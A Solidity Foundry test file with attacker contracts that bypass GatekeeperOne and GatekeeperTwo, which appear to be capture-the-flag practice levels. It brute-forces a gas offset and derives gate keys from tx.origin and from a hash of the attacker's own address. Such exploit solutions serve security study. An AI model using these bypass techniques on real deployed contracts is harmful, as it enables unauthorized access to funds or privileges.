// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {GatekeeperOne, GatekeeperTwo} from "../src/GateKeeperOne.sol";

contract Attacker {
    GatekeeperOne immutable target;

    constructor(address _target) {
        target = GatekeeperOne(_target);
    }

    function attack() external {
        // This satisfies the 3rd condition
        uint16 k16 = uint16(uint160(tx.origin));
        bytes8 key = bytes8(uint64(0x1000000000000000) | uint64(k16));

        // for 2nd condition we need to use a loop
        for (uint256 i = 0; i < 8191; i++) {
            try target.enter{gas: 81910 + i}(key) {
                console.log("Success! Gas offset found at:", i);
                return; 
            } catch {
        // If it fails, the loop continues to the next gas value
            }
        }
    }
}

contract AttackGate2 {
    bytes8 gateKey;

    constructor(address _target) {
        GatekeeperTwo target = GatekeeperTwo(_target);
        gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        require(target.enter(gateKey), "Unauthorized entry failed");
    }
}

contract GatekeeperOneTest is Test {
    GatekeeperOne gateKeeperOne;
    Attacker attacker;
    address user= makeAddr("user");

    function setUp() public {
        gateKeeperOne = new GatekeeperOne();
        attacker = new Attacker(address(gateKeeperOne));
    }

    function testAttackerCanBypassGatekeeper() public {
        vm.startPrank(user, user);
        attacker.attack();
        vm.stopPrank();

        assertEq(gateKeeperOne.entrant(), user);
    }
}

contract GatekeeperTwoTest is Test {
    GatekeeperTwo gateKeeperTwo;
    address user= makeAddr("user");

    function setUp() public {
        gateKeeperTwo = new GatekeeperTwo();
    }

    function testAttackerCanBypassGatekeeperTwo() public {
        vm.startPrank(user, user);
        new AttackGate2(address(gateKeeperTwo));
        vm.stopPrank();

        assertEq(gateKeeperTwo.entrant(), user);
    }
}